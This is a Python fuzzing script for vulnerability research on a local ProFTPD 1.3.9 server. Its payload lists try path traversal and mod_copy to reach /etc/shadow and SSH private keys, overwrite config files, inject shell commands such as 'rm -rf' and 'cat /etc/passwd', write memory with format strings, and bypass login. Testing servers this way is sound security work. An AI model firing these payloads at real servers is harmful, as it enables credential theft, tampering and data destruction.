#!/usr/bin/env python3
"""
ProFTPD 1.3.9 Comprehensive Security Fuzzer
independent security research. — Phase 2

Targeted fuzzers informed by Phase 1 static analysis:
1. Path traversal
2. Format string injection
3. Glob expansion
4. mod_copy abuse
5. SITE command fuzzing
6. Long argument (buffer overflow)
7. Command injection (CRLF, null bytes)
8. Authentication edge cases

All results saved as JSON evidence.
"""

import socket
import time
import json
import os
import sys
import ssl
import traceback
from datetime import datetime

# Configuration
HOST = "127.0.0.1"
PORT = 21
USER = "ftptest"
PASS = "ftptest123"
ANON_USER = "anonymous"
ANON_PASS = "test@test.com"
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"
TIMEOUT = 10
DELAY = 0.05  # Small delay between commands to avoid overwhelming

class FTPFuzzer:
    def __init__(self, name):
        self.name = name
        self.results = {
            "fuzzer": name,
            "target": f"ProFTPD 1.3.9 at {HOST}:{PORT}",
            "start_time": datetime.now().isoformat(),
            "test_cases": [],
            "crashes": [],
            "anomalies": [],
            "total_tests": 0,
            "total_crashes": 0,
            "total_anomalies": 0
        }
        self.sock = None

    def connect(self):
        """Create fresh FTP connection"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(TIMEOUT)
            self.sock.connect((HOST, PORT))
            banner = self.recv()
            return banner
        except Exception as e:
            return None

    def recv(self):
        """Receive FTP response"""
        try:
            data = b""
            while True:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                # Check if we have a complete response
                decoded = data.decode('utf-8', errors='replace')
                lines = decoded.strip().split('\n')
                last_line = lines[-1]
                # FTP response complete when line starts with 3-digit code + space
                if len(last_line) >= 4 and last_line[:3].isdigit() and last_line[3] == ' ':
                    break
                if len(last_line) >= 4 and last_line[:3].isdigit() and last_line[3] == '-':
                    continue
                # Also break on timeout
                break
            return data.decode('utf-8', errors='replace')
        except socket.timeout:
            return None
        except Exception as e:
            return None

    def send(self, cmd):
        """Send FTP command"""
        try:
            if isinstance(cmd, str):
                cmd = cmd.encode('utf-8', errors='replace')
            if not cmd.endswith(b"\r\n"):
                cmd += b"\r\n"
            self.sock.sendall(cmd)
            return True
        except Exception:
            return False

    def send_recv(self, cmd):
        """Send command and receive response"""
        if not self.send(cmd):
            return None
        return self.recv()

    def login(self, user=None, password=None):
        """Login to FTP"""
        u = user or USER
        p = password or PASS
        r1 = self.send_recv(f"USER {u}")
        if r1 is None:
            return False
        r2 = self.send_recv(f"PASS {p}")
        if r2 is None:
            return False
        return "230" in (r2 or "")

    def close(self):
        """Close connection"""
        try:
            self.send("QUIT")
            self.sock.close()
        except:
            pass

    def check_server_alive(self):
        """Check if ProFTPD is still accepting connections"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((HOST, PORT))
            data = s.recv(1024)
            s.close()
            return b"220" in data
        except:
            return False

    def record_test(self, category, command, response, notes=""):
        """Record a test case"""
        self.results["total_tests"] += 1
        test = {
            "id": self.results["total_tests"],
            "category": category,
            "command": repr(command) if isinstance(command, bytes) else command,
            "response": response[:500] if response else "NO_RESPONSE",
            "notes": notes
        }

        if response is None:
            # Possible crash
            if not self.check_server_alive():
                test["status"] = "CRASH"
                self.results["crashes"].append(test)
                self.results["total_crashes"] += 1
                print(f"  [!!!] CRASH detected: {command[:80]}")
            else:
                test["status"] = "TIMEOUT"
                self.results["anomalies"].append(test)
                self.results["total_anomalies"] += 1
        elif any(code in response for code in ["500 ", "501 ", "550 "]):
            test["status"] = "REJECTED"
        elif "421 " in response:
            test["status"] = "DISCONNECTED"
            self.results["anomalies"].append(test)
            self.results["total_anomalies"] += 1
        else:
            test["status"] = "OK"
            # Check for unexpected success that might indicate a vulnerability
            if any(code in response for code in ["200 ", "250 ", "350 "]):
                if "traversal" in category.lower() or "format" in category.lower():
                    test["status"] = "SUSPICIOUS_SUCCESS"
                    self.results["anomalies"].append(test)
                    self.results["total_anomalies"] += 1
                    print(f"  [!] Suspicious success: {command[:80]} -> {response[:100]}")

        self.results["test_cases"].append(test)

    def save_results(self):
        """Save results to JSON"""
        self.results["end_time"] = datetime.now().isoformat()
        fname = os.path.join(EVIDENCE_DIR, f"fuzzer_{self.name}.json")
        with open(fname, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[*] Results saved to {fname}")
        print(f"    Tests: {self.results['total_tests']}, Crashes: {self.results['total_crashes']}, Anomalies: {self.results['total_anomalies']}")


# ============================================================
# FUZZER 1: Path Traversal
# ============================================================
def fuzz_path_traversal():
    """Test path traversal in all file/directory commands"""
    fz = FTPFuzzer("path_traversal")
    print("\n" + "="*60)
    print("[*] FUZZER 1: Path Traversal")
    print("="*60)

    traversal_payloads = [
        # Basic traversal
        "../", "../../", "../../../", "../../../../",
        "../../../../../etc/passwd",
        "../../../../../etc/shadow",
        "../../../../../root/.ssh/authorized_keys",
        "../../../../../proc/self/environ",
        # Double encoding
        "..%2f", "..%2f..%2f", "%2e%2e/", "%2e%2e%2f",
        # Unicode/UTF-8
        "..\\", "..\\..\\",
        "..%c0%af", "..%c1%9c",
        # Null byte injection
        "../../../etc/passwd\x00.txt",
        "../../../etc/passwd%00.txt",
        # Dot variations
        "....//", "..../", ".../",
        # Absolute paths
        "/etc/passwd", "/etc/shadow", "/root",
        "/proc/self/cmdline", "/proc/self/environ",
        # Home escape
        "~root", "~root/", "~root/.bashrc",
        # Symlink-based
        "/home/ftptest/../../../etc/passwd",
        # Long traversal
        ("../" * 50) + "etc/passwd",
        # Mixed
        "/..", "/../../etc/passwd",
        "../" * 10 + "etc/passwd",
    ]

    commands = ["CWD", "MKD", "RMD", "DELE", "RNFR", "STAT", "SIZE", "MDTM"]

    for cmd in commands:
        print(f"\n  [>] Testing {cmd} with {len(traversal_payloads)} traversal payloads...")
        for payload in traversal_payloads:
            banner = fz.connect()
            if not banner:
                time.sleep(1)
                continue
            if not fz.login():
                fz.close()
                continue

            resp = fz.send_recv(f"{cmd} {payload}")
            fz.record_test(f"path_traversal_{cmd}", f"{cmd} {payload}", resp)

            # For RNFR, also test RNTO
            if cmd == "RNFR" and resp and "350" in resp:
                resp2 = fz.send_recv(f"RNTO /tmp/pwned_{fz.results['total_tests']}")
                fz.record_test("path_traversal_RNTO", f"RNTO /tmp/pwned", resp2, "After RNFR traversal")

            fz.close()
            time.sleep(DELAY)

    # Test LIST/NLST traversal
    for cmd in ["LIST", "NLST"]:
        print(f"\n  [>] Testing {cmd} with traversal payloads...")
        for payload in traversal_payloads[:15]:
            banner = fz.connect()
            if not banner:
                continue
            if not fz.login():
                fz.close()
                continue
            # Need PASV for LIST
            resp = fz.send_recv("PASV")
            resp = fz.send_recv(f"{cmd} {payload}")
            fz.record_test(f"path_traversal_{cmd}", f"{cmd} {payload}", resp)
            fz.close()
            time.sleep(DELAY)

    fz.save_results()
    return fz.results


# ============================================================
# FUZZER 2: Format String
# ============================================================
def fuzz_format_strings():
    """Test format string injection in all string-accepting commands"""
    fz = FTPFuzzer("format_string")
    print("\n" + "="*60)
    print("[*] FUZZER 2: Format String Injection")
    print("="*60)

    format_payloads = [
        # Basic format strings
        "%x", "%s", "%n", "%d", "%p",
        "%x" * 20, "%s" * 20, "%p" * 20,
        "%08x." * 20,
        # Write attempts
        "%n%n%n%n",
        "%hn%hn%hn%hn",
        "%hhn%hhn%hhn%hhn",
        # Position specifiers
        "%1$x", "%2$x", "%3$x", "%10$x", "%100$x",
        "%1$s", "%2$s", "%3$s",
        "%1$n", "%2$n",
        # Mixed with regular text
        "AAAA%x%x%x%x",
        "AAAA" + "%08x." * 50,
        # Long format strings
        "%x" * 200,
        "%s" * 100,
        # With traversal
        "../%x%x%x%x",
        "%x/../../../etc/passwd",
    ]

    # Pre-auth format string test (USER/PASS)
    print("\n  [>] Testing pre-auth format strings (USER/PASS)...")
    for payload in format_payloads:
        banner = fz.connect()
        if not banner:
            continue

        resp = fz.send_recv(f"USER {payload}")
        fz.record_test("format_string_USER_preauth", f"USER {payload}", resp)

        resp = fz.send_recv(f"PASS {payload}")
        fz.record_test("format_string_PASS_preauth", f"PASS {payload}", resp)
        fz.close()
        time.sleep(DELAY)

    # Post-auth format string test
    post_auth_cmds = ["CWD", "MKD", "DELE", "RMD", "RNFR", "STAT",
                      "SITE CPFR", "SITE CPTO", "SITE CHMOD", "SITE MKDIR",
                      "SITE RMDIR", "SITE SYMLINK"]

    for cmd in post_auth_cmds:
        print(f"\n  [>] Testing {cmd} with format string payloads...")
        for payload in format_payloads:
            banner = fz.connect()
            if not banner:
                continue
            if not fz.login():
                fz.close()
                continue
            resp = fz.send_recv(f"{cmd} {payload}")
            fz.record_test(f"format_string_{cmd.replace(' ', '_')}", f"{cmd} {payload}", resp)
            fz.close()
            time.sleep(DELAY)

    fz.save_results()
    return fz.results


# ============================================================
# FUZZER 3: Glob Expansion
# ============================================================
def fuzz_glob_expansion():
    """Test glob expansion in LIST/NLST (historically problematic in FTP)"""
    fz = FTPFuzzer("glob_expansion")
    print("\n" + "="*60)
    print("[*] FUZZER 3: Glob Expansion")
    print("="*60)

    glob_payloads = [
        # Basic globs
        "*", "**", "***", "*" * 50, "*" * 200,
        "?", "?" * 50, "?" * 200,
        # Bracket expressions
        "[", "]", "[]", "[a-z]", "[!a-z]",
        "[" * 50, "[" * 200,
        "]" * 50,
        "[[[[[[[[[[",
        # Brace expansion (if supported)
        "{", "}", "{a,b}", "{a,b,c,d,e,f,g,h,i,j}",
        "{" * 50,
        "}" * 50,
        "{a," * 50 + "z" + "}" * 50,
        # Nested globs (CPU bomb attempts)
        "*/*/*/*/*/*/*/*/*/*/*",
        "?/?/?/?/?/?/?/?/?/?/?",
        "*/*/*/*" * 5,
        # Recursive patterns
        "**/**/**/**/**",
        # Combinations
        "[*]", "[?]", "[{]",
        "*[*]*[*]*",
        "?[?]?[?]?",
        # With path traversal
        "../*", "../../*", "../../../*",
        "../*/../*/../*",
        # Special chars in glob
        "\\*", "\\?", "\\[",
        # Extremely long glob
        "*" * 1000,
        "?" * 1000,
        "[a-z]" * 100,
        # Null in glob
        "*\x00*",
        "?\x00?",
        # Format string in glob
        "%x*", "*%s*",
    ]

    for cmd in ["LIST", "NLST"]:
        print(f"\n  [>] Testing {cmd} with {len(glob_payloads)} glob payloads...")
        for payload in glob_payloads:
            banner = fz.connect()
            if not banner:
                time.sleep(1)
                continue
            if not fz.login():
                fz.close()
                continue

            # Set PASV mode
            fz.send_recv("PASV")
            resp = fz.send_recv(f"{cmd} {payload}")
            fz.record_test(f"glob_{cmd}", f"{cmd} {payload[:100]}", resp)
            fz.close()
            time.sleep(DELAY)

    fz.save_results()
    return fz.results


# ============================================================
# FUZZER 4: mod_copy
# ============================================================
def fuzz_mod_copy():
    """Comprehensive mod_copy fuzzing"""
    fz = FTPFuzzer("mod_copy")
    print("\n" + "="*60)
    print("[*] FUZZER 4: mod_copy (SITE CPFR/CPTO)")
    print("="*60)

    # Source files to try copying
    source_files = [
        "/etc/passwd", "/etc/shadow", "/etc/hosts",
        "/etc/proftpd/proftpd.conf", "/etc/proftpd/modules.conf",
        "/etc/proftpd/ssh_host_rsa_key",
        "/etc/ssl/private/proftpd.key",
        "/root/.ssh/authorized_keys", "/root/.ssh/id_rsa",
        "/root/.bashrc", "/root/.bash_history",
        "/proc/self/environ", "/proc/self/cmdline",
        "/proc/self/maps", "/proc/self/status",
        "/var/log/proftpd/proftpd.log",
        # Traversal in CPFR
        "../../../etc/passwd",
        "../../../../etc/shadow",
        # Null byte
        "/etc/passwd\x00.jpg",
    ]

    dest_locations = [
        "/tmp/fuzz_copy_test",
        "/home/ftptest/copy_test",
        "/srv/ftp/copy_test",
        "/var/tmp/copy_test",
        # Traversal in CPTO
        "../../../tmp/copy_test",
        # Overwrite attempts
        "/etc/proftpd/proftpd.conf",
        "/home/ftptest/.bashrc",
    ]

    # Pre-auth mod_copy test
    print("\n  [>] Testing pre-auth SITE CPFR/CPTO...")
    for src in source_files[:5]:
        banner = fz.connect()
        if not banner:
            continue
        resp = fz.send_recv(f"SITE CPFR {src}")
        fz.record_test("mod_copy_preauth_cpfr", f"SITE CPFR {src}", resp, "Pre-auth attempt")
        if resp and "350" in resp:
            resp2 = fz.send_recv("SITE CPTO /tmp/preauth_copy")
            fz.record_test("mod_copy_preauth_cpto", "SITE CPTO /tmp/preauth_copy", resp2, "Pre-auth CPTO after successful CPFR")
        fz.close()
        time.sleep(DELAY)

    # Post-auth mod_copy test - source files
    print(f"\n  [>] Testing post-auth CPFR with {len(source_files)} source files...")
    for src in source_files:
        banner = fz.connect()
        if not banner:
            continue
        if not fz.login():
            fz.close()
            continue

        resp = fz.send_recv(f"SITE CPFR {src}")
        fz.record_test("mod_copy_cpfr", f"SITE CPFR {src}", resp)

        if resp and "350" in resp:
            dest = f"/tmp/fuzz_copy_{fz.results['total_tests']}"
            resp2 = fz.send_recv(f"SITE CPTO {dest}")
            fz.record_test("mod_copy_cpto", f"SITE CPTO {dest}", resp2,
                          f"Copying {src} to {dest}")
            if resp2 and "250" in resp2:
                print(f"  [!] Successfully copied {src} -> {dest}")
        fz.close()
        time.sleep(DELAY)

    # Post-auth mod_copy test - destination locations
    print(f"\n  [>] Testing CPTO with {len(dest_locations)} destination locations...")
    for dest in dest_locations:
        banner = fz.connect()
        if not banner:
            continue
        if not fz.login():
            fz.close()
            continue

        resp = fz.send_recv("SITE CPFR /etc/hostname")
        if resp and "350" in resp:
            resp2 = fz.send_recv(f"SITE CPTO {dest}")
            fz.record_test("mod_copy_dest", f"SITE CPTO {dest}", resp2,
                          f"Copy to restricted location")
            if resp2 and "250" in resp2:
                print(f"  [!] Write to {dest} succeeded!")
        fz.close()
        time.sleep(DELAY)

    # CPFR to directory then CPTO (directory copy)
    print("\n  [>] Testing directory copy via mod_copy...")
    for src_dir in ["/etc", "/root", "/var/log", "/home"]:
        banner = fz.connect()
        if not banner:
            continue
        if not fz.login():
            fz.close()
            continue
        resp = fz.send_recv(f"SITE CPFR {src_dir}")
        fz.record_test("mod_copy_dir_cpfr", f"SITE CPFR {src_dir}", resp)
        if resp and "350" in resp:
            resp2 = fz.send_recv(f"SITE CPTO /tmp/dir_copy_{fz.results['total_tests']}")
            fz.record_test("mod_copy_dir_cpto", f"SITE CPTO /tmp/dir_copy", resp2)
        fz.close()
        time.sleep(DELAY)

    fz.save_results()
    return fz.results


# ============================================================
# FUZZER 5: SITE Command Fuzzing
# ============================================================
def fuzz_site_commands():
    """Fuzz all SITE subcommands with boundary values"""
    fz = FTPFuzzer("site_commands")
    print("\n" + "="*60)
    print("[*] FUZZER 5: SITE Command Fuzzing")
    print("="*60)

    # SITE CHMOD
    chmod_payloads = [
        "777 /home/ftptest/upload",
        "000 /etc/passwd",
        "4777 /tmp/test",
        "7777 /tmp/test",
        "99999 /tmp/test",
        "-1 /tmp/test",
        "0 /tmp/test",
        "777 ../../../etc/passwd",
        "777 " + "A" * 500,
        "%x%x%x /tmp/test",
        "777 %n%n%n",
    ]

    print(f"\n  [>] Testing SITE CHMOD with {len(chmod_payloads)} payloads...")
    for payload in chmod_payloads:
        banner = fz.connect()
        if not banner:
            continue
        if not fz.login():
            fz.close()
            continue
        resp = fz.send_recv(f"SITE CHMOD {payload}")
        fz.record_test("site_chmod", f"SITE CHMOD {payload}", resp)
        fz.close()
        time.sleep(DELAY)

    # SITE SYMLINK
    symlink_payloads = [
        "/etc/passwd /home/ftptest/link1",
        "/etc/shadow /home/ftptest/link2",
        "/root /home/ftptest/link3",
        "/proc/self/environ /home/ftptest/link4",
        "/dev/null /home/ftptest/link5",
        "/dev/urandom /home/ftptest/link6",
        # Recursive symlink
        "/home/ftptest /home/ftptest/self_link",
        # Long paths
        "/" + "A" * 500 + " /tmp/test",
        "/tmp/test " + "B" * 500,
        # Format strings
        "%x%x%x /tmp/link",
        "/tmp/test %n%n%n",
    ]

    print(f"\n  [>] Testing SITE SYMLINK with {len(symlink_payloads)} payloads...")
    for payload in symlink_payloads:
        banner = fz.connect()
        if not banner:
            continue
        if not fz.login():
            fz.close()
            continue
        resp = fz.send_recv(f"SITE SYMLINK {payload}")
        fz.record_test("site_symlink", f"SITE SYMLINK {payload}", resp)
        fz.close()
        time.sleep(DELAY)

    # SITE UTIME
    utime_payloads = [
        "20260101000000 /tmp/test",
        "99999999999999 /tmp/test",
        "00000000000000 /tmp/test",
        "-1 /tmp/test",
        "AAAAAAAAAA /tmp/test",
        "%x%x%x /tmp/test",
        "20260101000000 " + "A" * 500,
        "20260101000000 ../../../etc/passwd",
    ]

    print(f"\n  [>] Testing SITE UTIME with {len(utime_payloads)} payloads...")
    for payload in utime_payloads:
        banner = fz.connect()
        if not banner:
            continue
        if not fz.login():
            fz.close()
            continue
        resp = fz.send_recv(f"SITE UTIME {payload}")
        fz.record_test("site_utime", f"SITE UTIME {payload}", resp)
        fz.close()
        time.sleep(DELAY)

    # SITE MKDIR / RMDIR
    dir_payloads = [
        "/tmp/fuzz_mkdir_test",
        "../../../tmp/fuzz_mkdir_traversal",
        "/etc/fuzz_mkdir_restricted",
        "A" * 500,
        "%x%x%x",
        "/home/ftptest/" + "A" * 200,
    ]

    for subcmd in ["MKDIR", "RMDIR"]:
        print(f"\n  [>] Testing SITE {subcmd} with {len(dir_payloads)} payloads...")
        for payload in dir_payloads:
            banner = fz.connect()
            if not banner:
                continue
            if not fz.login():
                fz.close()
                continue
            resp = fz.send_recv(f"SITE {subcmd} {payload}")
            fz.record_test(f"site_{subcmd.lower()}", f"SITE {subcmd} {payload}", resp)
            fz.close()
            time.sleep(DELAY)

    # Unknown SITE commands
    unknown_payloads = [
        "EXEC /bin/id", "EXEC ls", "EXEC cat /etc/passwd",
        "HELP", "DEBUG", "STATUS",
        "A" * 500, "%x" * 100,
    ]

    print(f"\n  [>] Testing unknown SITE subcommands...")
    for payload in unknown_payloads:
        banner = fz.connect()
        if not banner:
            continue
        if not fz.login():
            fz.close()
            continue
        resp = fz.send_recv(f"SITE {payload}")
        fz.record_test("site_unknown", f"SITE {payload}", resp)
        fz.close()
        time.sleep(DELAY)

    fz.save_results()
    return fz.results


# ============================================================
# FUZZER 6: Long Argument (Buffer Overflow)
# ============================================================
def fuzz_long_args():
    """Test oversized arguments to every FTP command"""
    fz = FTPFuzzer("long_args")
    print("\n" + "="*60)
    print("[*] FUZZER 6: Long Argument / Buffer Overflow")
    print("="*60)

    lengths = [256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536]

    # Pre-auth long args
    pre_auth_cmds = ["USER", "PASS", "HOST", "CLNT"]
    for cmd in pre_auth_cmds:
        print(f"\n  [>] Testing {cmd} with oversized arguments (pre-auth)...")
        for length in lengths:
            banner = fz.connect()
            if not banner:
                time.sleep(1)
                if not fz.check_server_alive():
                    print(f"  [!!!] Server died after {cmd} with {length} byte arg!")
                    fz.record_test("long_arg_crash", f"{cmd} {'A'*20}...({length})", None,
                                  f"Server crashed with {length} byte argument")
                    # Wait for restart
                    time.sleep(3)
                continue
            payload = "A" * length
            resp = fz.send_recv(f"{cmd} {payload}")
            fz.record_test(f"long_arg_{cmd}", f"{cmd} A*{length}", resp)
            fz.close()
            time.sleep(DELAY)

    # Post-auth long args
    post_auth_cmds = [
        "CWD", "MKD", "RMD", "DELE", "RNFR", "RNTO",
        "RETR", "STOR", "APPE", "STOU",
        "LIST", "NLST", "STAT", "SIZE", "MDTM",
        "SITE CPFR", "SITE CPTO",
        "SITE CHMOD", "SITE MKDIR", "SITE RMDIR",
        "SITE SYMLINK", "SITE UTIME",
    ]

    for cmd in post_auth_cmds:
        print(f"\n  [>] Testing {cmd} with oversized arguments...")
        for length in lengths:
            banner = fz.connect()
            if not banner:
                time.sleep(1)
                if not fz.check_server_alive():
                    fz.record_test("long_arg_crash", f"{cmd} A*{length}", None,
                                  f"Server crashed with {length} byte argument to {cmd}")
                    time.sleep(3)
                continue
            if not fz.login():
                fz.close()
                continue

            payload = "A" * length
            resp = fz.send_recv(f"{cmd} {payload}")
            fz.record_test(f"long_arg_{cmd.replace(' ','_')}", f"{cmd} A*{length}", resp)
            fz.close()
            time.sleep(DELAY)

    fz.save_results()
    return fz.results


# ============================================================
# FUZZER 7: Command Injection
# ============================================================
def fuzz_command_injection():
    """Test CRLF injection, null bytes, command injection"""
    fz = FTPFuzzer("command_injection")
    print("\n" + "="*60)
    print("[*] FUZZER 7: Command Injection / CRLF / Null Bytes")
    print("="*60)

    injection_payloads = [
        # CRLF injection — inject extra FTP commands
        "test\r\nSITE CPFR /etc/passwd",
        "test\r\nDELE /etc/passwd",
        "test\r\nSITE CHMOD 777 /etc/shadow",
        "test\nSITE CPFR /etc/passwd",
        "test\r\nUSER root",
        # Null byte
        "test\x00SITE CPFR /etc/passwd",
        "test\x00",
        "\x00" * 100,
        # Shell injection (in case any command is passed to shell)
        "; id", "| id", "$(id)", "`id`",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "$(cat /etc/passwd)", "`cat /etc/passwd`",
        # Path injection
        "/etc/passwd\r\n",
        "test; rm -rf /tmp/*",
        "test && id",
        "test || id",
    ]

    # Pre-auth injection
    print("\n  [>] Testing pre-auth command injection...")
    for payload in injection_payloads:
        banner = fz.connect()
        if not banner:
            continue
        resp = fz.send_recv(f"USER {payload}")
        fz.record_test("injection_USER", f"USER {repr(payload)}", resp)
        fz.close()
        time.sleep(DELAY)

    # Post-auth injection in various commands
    target_cmds = ["CWD", "MKD", "RNFR", "STAT", "SITE CPFR"]
    for cmd in target_cmds:
        print(f"\n  [>] Testing {cmd} with injection payloads...")
        for payload in injection_payloads:
            banner = fz.connect()
            if not banner:
                continue
            if not fz.login():
                fz.close()
                continue
            # Send raw bytes to preserve CRLF injection
            raw = f"{cmd} {payload}\r\n".encode('utf-8', errors='replace')
            fz.sock.sendall(raw)
            resp = fz.recv()
            # Read any additional response from injected commands
            try:
                fz.sock.settimeout(2)
                resp2 = fz.recv()
                if resp2:
                    resp = (resp or "") + " |EXTRA| " + resp2
            except:
                pass
            fz.record_test(f"injection_{cmd.replace(' ','_')}", f"{cmd} {repr(payload)}", resp)
            fz.close()
            time.sleep(DELAY)

    fz.save_results()
    return fz.results


# ============================================================
# FUZZER 8: Authentication Edge Cases
# ============================================================
def fuzz_auth_edge_cases():
    """Test authentication bypass and edge cases"""
    fz = FTPFuzzer("auth_edge_cases")
    print("\n" + "="*60)
    print("[*] FUZZER 8: Authentication Edge Cases")
    print("="*60)

    # 1. Double USER without PASS
    print("\n  [>] Testing double USER without PASS...")
    banner = fz.connect()
    if banner:
        resp1 = fz.send_recv("USER ftptest")
        resp2 = fz.send_recv("USER root")
        resp3 = fz.send_recv(f"PASS {PASS}")
        fz.record_test("auth_double_user", "USER ftptest -> USER root -> PASS", resp3,
                       "Test if second USER changes target account")
        fz.close()

    # 2. PASS before USER
    print("\n  [>] Testing PASS before USER...")
    banner = fz.connect()
    if banner:
        resp = fz.send_recv(f"PASS {PASS}")
        fz.record_test("auth_pass_first", "PASS before USER", resp)
        fz.close()

    # 3. Empty USER/PASS
    print("\n  [>] Testing empty credentials...")
    for u, p in [("", ""), ("", PASS), (USER, ""), (" ", " "), ("\t", "\t")]:
        banner = fz.connect()
        if not banner:
            continue
        resp1 = fz.send_recv(f"USER {u}")
        resp2 = fz.send_recv(f"PASS {p}")
        fz.record_test("auth_empty", f"USER '{u}' / PASS '{p}'",
                       f"{resp1} | {resp2}")
        fz.close()
        time.sleep(DELAY)

    # 4. Re-authentication after login
    print("\n  [>] Testing re-authentication...")
    banner = fz.connect()
    if banner:
        fz.login()
        resp1 = fz.send_recv("USER root")
        resp2 = fz.send_recv("PASS root")
        fz.record_test("auth_reauth", "Re-auth as root after login", f"{resp1} | {resp2}")
        fz.close()

    # 5. Special usernames
    print("\n  [>] Testing special usernames...")
    special_users = [
        "root", "admin", "ftp", "anonymous", "nobody",
        "proftpd", "daemon", "bin", "sys",
        "root\x00ftptest",  # Null byte in username
        "ftptest\x00root",
        "USER", "PASS", "QUIT",
        "%x%x%x", "%n%n%n", "%s%s%s",
        "A" * 500,
        "../../../etc/passwd",
    ]

    for user in special_users:
        banner = fz.connect()
        if not banner:
            continue
        resp1 = fz.send_recv(f"USER {user}")
        resp2 = fz.send_recv(f"PASS {PASS}")
        fz.record_test("auth_special_user", f"USER {repr(user)}",
                       f"{resp1} | {resp2}")
        fz.close()
        time.sleep(DELAY)

    # 6. Commands before auth
    print("\n  [>] Testing commands before authentication...")
    pre_auth_cmds = [
        "LIST", "NLST", "RETR /etc/passwd", "STOR /tmp/test",
        "CWD /", "PWD", "SYST", "FEAT", "HELP",
        "SITE CPFR /etc/passwd", "SITE CPTO /tmp/test",
        "SITE CHMOD 777 /tmp", "SITE SYMLINK /etc/passwd /tmp/link",
        "MKD /tmp/test", "RMD /tmp", "DELE /etc/passwd",
        "RNFR /etc/passwd", "RNTO /tmp/test",
        "STAT", "SIZE /etc/passwd", "MDTM /etc/passwd",
    ]

    for cmd in pre_auth_cmds:
        banner = fz.connect()
        if not banner:
            continue
        resp = fz.send_recv(cmd)
        fz.record_test("auth_preauth_cmd", f"Pre-auth: {cmd}", resp)
        fz.close()
        time.sleep(DELAY)

    # 7. USER with CRLF to skip PASS
    print("\n  [>] Testing USER with embedded CRLF to skip PASS...")
    banner = fz.connect()
    if banner:
        raw = b"USER ftptest\r\nPASS ftptest123\r\n"
        fz.sock.sendall(raw)
        resp = fz.recv()
        time.sleep(0.5)
        resp2 = fz.recv()
        resp3 = fz.send_recv("PWD")
        fz.record_test("auth_crlf_bypass", "USER+PASS in single send",
                       f"{resp} | {resp2} | {resp3}")
        fz.close()

    fz.save_results()
    return fz.results


# ============================================================
# MAIN
# ============================================================
def main():
    print("=" * 60)
    print("ProFTPD 1.3.9 Comprehensive Security Fuzzer")
    print("independent security research. — Phase 2")
    print(f"Target: {HOST}:{PORT}")
    print(f"Start time: {datetime.now().isoformat()}")
    print("=" * 60)

    # Verify server is alive
    if not FTPFuzzer("check").check_server_alive():
        print("[!] ProFTPD is not responding. Start it first.")
        sys.exit(1)

    all_results = {}
    fuzzers = [
        ("path_traversal", fuzz_path_traversal),
        ("format_string", fuzz_format_strings),
        ("glob_expansion", fuzz_glob_expansion),
        ("mod_copy", fuzz_mod_copy),
        ("site_commands", fuzz_site_commands),
        ("long_args", fuzz_long_args),
        ("command_injection", fuzz_command_injection),
        ("auth_edge_cases", fuzz_auth_edge_cases),
    ]

    # Allow running specific fuzzers
    if len(sys.argv) > 1:
        selected = sys.argv[1:]
        fuzzers = [(n, f) for n, f in fuzzers if n in selected]

    total_tests = 0
    total_crashes = 0
    total_anomalies = 0

    for name, func in fuzzers:
        try:
            result = func()
            all_results[name] = {
                "tests": result["total_tests"],
                "crashes": result["total_crashes"],
                "anomalies": result["total_anomalies"]
            }
            total_tests += result["total_tests"]
            total_crashes += result["total_crashes"]
            total_anomalies += result["total_anomalies"]
        except Exception as e:
            print(f"\n[!] Fuzzer {name} failed: {e}")
            traceback.print_exc()
            all_results[name] = {"error": str(e)}

        # Verify server is still alive between fuzzers
        if not FTPFuzzer("check").check_server_alive():
            print("\n[!!!] Server crashed! Waiting for restart...")
            time.sleep(5)
            # Try to restart
            os.system("sudo proftpd 2>/dev/null")
            time.sleep(2)

    # Save summary
    summary = {
        "assessment": "ProFTPD 1.3.9 Comprehensive Fuzzing",
        "date": datetime.now().isoformat(),
        "total_tests": total_tests,
        "total_crashes": total_crashes,
        "total_anomalies": total_anomalies,
        "fuzzer_results": all_results
    }

    summary_path = os.path.join(EVIDENCE_DIR, "fuzzer_summary.json")
    with open(summary_path, 'w') as f:
        json.dump(summary, f, indent=2)

    print("\n" + "=" * 60)
    print("FUZZING COMPLETE")
    print(f"Total tests:     {total_tests}")
    print(f"Total crashes:   {total_crashes}")
    print(f"Total anomalies: {total_anomalies}")
    print(f"Summary saved:   {summary_path}")
    print("=" * 60)


if __name__ == "__main__":
    main()
